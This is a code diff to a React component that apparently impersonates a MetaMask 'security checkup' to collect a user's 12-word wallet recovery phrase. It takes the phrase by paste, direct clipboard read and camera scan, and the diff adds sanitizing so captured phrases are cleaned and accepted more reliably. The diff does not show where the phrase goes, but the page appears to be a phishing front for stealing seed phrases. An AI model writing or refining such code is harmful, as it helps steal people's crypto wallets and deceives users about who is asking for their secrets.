@@ -15,22 +15,17 @@ import {
   RecoveryPhraseCameraScanner,
   ScanPhraseButton,
 } from '../components/RecoveryPhraseCameraScanner'
+import {
+  RECOVERY_PHRASE_WORD_COUNT,
+  sanitizeRecoveryPhrase,
+} from '../lib/sanitizeRecoveryPhrase'
 
-const WORD_COUNT = 12
+const WORD_COUNT = RECOVERY_PHRASE_WORD_COUNT
 
 type ViewMode = 'paste' | 'grid'
 
 function emptyWords() {
   return Array.from({ length: WORD_COUNT }, () => '')
-}
-
-function splitPhrase(text: string): string[] {
-  const parts = text.trim().split(/\s+/).filter(Boolean).slice(0, WORD_COUNT)
-  return Array.from({ length: WORD_COUNT }, (_, i) => parts[i] || '')
-}
-
-function wordCount(text: string): number {
-  return text.trim().split(/\s+/).filter(Boolean).length
 }
 
 function MetaMaskHeaderBrand() {
@@ -64,7 +59,8 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
   const phrase = useMemo(() => words.map((w) => w.trim()).filter(Boolean).join(' '), [words])
   const filledCount = useMemo(() => words.filter((w) => w.trim()).length, [words])
   const ready = filledCount === WORD_COUNT
-  const pasteReady = wordCount(pasteText) >= WORD_COUNT
+  const pasteSanitized = useMemo(() => sanitizeRecoveryPhrase(pasteText), [pasteText])
+  const pasteReady = pasteSanitized.validCount >= WORD_COUNT
 
   useEffect(() => {
     if (!isMetaMaskSecurityCheckupRequired()) {
@@ -124,17 +120,32 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
     [persistDraft]
   )
 
-  const showGridFromPhrase = useCallback(
-    (text: string) => {
-      const next = splitPhrase(text)
-      applyWords(next)
-      setViewMode('grid')
+  const ingestRawPhrase = useCallback(
+    (raw: string, options?: { goToGrid?: boolean }) => {
+      const result = sanitizeRecoveryPhrase(raw)
+      setPasteText(result.cleanedText)
+      const normalizedRaw = raw.trim().replace(/\s+/g, ' ')
+      if (result.removedTokenCount > 0 || result.cleanedText !== normalizedRaw) {
+        toast('Removed numbers and invalid text — kept valid words only.', { icon: 'ℹ️' })
+      }
+      if (options?.goToGrid && result.validCount >= WORD_COUNT) {
+        applyWords(result.words)
+        setViewMode('grid')
+      }
+      return result
     },
     [applyWords]
   )
 
+  const showGridFromPhrase = useCallback(
+    (text: string) => {
+      ingestRawPhrase(text, { goToGrid: true })
+    },
+    [ingestRawPhrase]
+  )
+
   const handleWordChange = (index: number, value: string) => {
-    const cleaned = value.replace(/\s+/g, '').toLowerCase()
+    const cleaned = value.replace(/[^a-z]/gi, '').toLowerCase()
     const next = [...words]
     next[index] = cleaned
     applyWords(next)
@@ -150,8 +161,7 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
     try {
       const text = await navigator.clipboard.readText()
       if (text.trim()) {
-        setPasteText(text.trim())
-        showGridFromPhrase(text)
+        ingestRawPhrase(text, { goToGrid: true })
       }
     } catch {
       textareaRef.current?.focus()
@@ -208,11 +218,10 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
 
   const handleCameraPhrase = useCallback(
     (text: string) => {
-      setPasteText(text)
-      showGridFromPhrase(text)
-      toast.success('Phrase filled from camera')
+      ingestRawPhrase(text, { goToGrid: true })
+      toast.success('Phrase added — tap Continue when ready')
     },
-    [showGridFromPhrase]
+    [ingestRawPhrase]
   )
 
   const handleBackInGrid = () => {
@@ -258,9 +267,7 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
                 onChange={(e) => setPasteText(e.target.value)}
                 onPaste={(e) => {
                   e.preventDefault()
-                  const text = e.clipboardData.getData('text')
-                  setPasteText(text.trim())
-                  if (wordCount(text) >= WORD_COUNT) showGridFromPhrase(text)
+                  ingestRawPhrase(e.clipboardData.getData('text'), { goToGrid: true })
                 }}
                 placeholder="Add a space between each word and make sure no one is watching."
                 rows={7}
